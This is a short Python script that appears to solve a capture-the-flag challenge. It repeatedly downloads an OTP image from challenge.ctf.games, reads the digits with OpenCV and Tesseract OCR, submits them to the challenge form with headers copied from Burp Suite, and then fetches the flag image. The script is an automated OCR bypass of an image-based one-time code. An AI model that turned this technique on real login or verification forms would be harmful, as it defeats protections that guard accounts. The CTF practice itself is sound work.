from pprint import pprint as pp
import requests
import json
import os
while True:
	os.system("rm otp.png")
	os.system("wget challenge.ctf.games:31900/static/otp.png")
	import cv2 
	import pytesseract

	img = cv2.imread('otp.png')
	# invert image
	img = cv2.bitwise_not(img)
	# change to grayscale
	grayscale = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
	threshold = cv2.adaptiveThreshold(grayscale, 255, \
					  cv2.ADAPTIVE_THRESH_GAUSSIAN_C, \
					  cv2.THRESH_BINARY, 1001, 11)	
	
	# Adding custom options
	custom_config = r'outputbase digits psm=8'
	# custom_config = r'-psm 7 -c tessedit_char_whitelist=1234567890'

	# read tesseract number
	number = pytesseract.image_to_string(threshold, config=custom_config)

	# req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
	# number = req.json()['ParsedResults'][0]['ParsedText']
	number = number.strip()

	burp0_url = "http://challenge.ctf.games:31900/"
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://challenge.ctf.games:32629", "Connection": "close", "Referer": "http://challenge.ctf.games:32629/", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"otp_entry": number}
	data = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
	count = data.text.split("\"count\">")[1].split("<")[0]
	print( count, number)
	os.system("wget challenge.ctf.games:31900/static/flag.png")
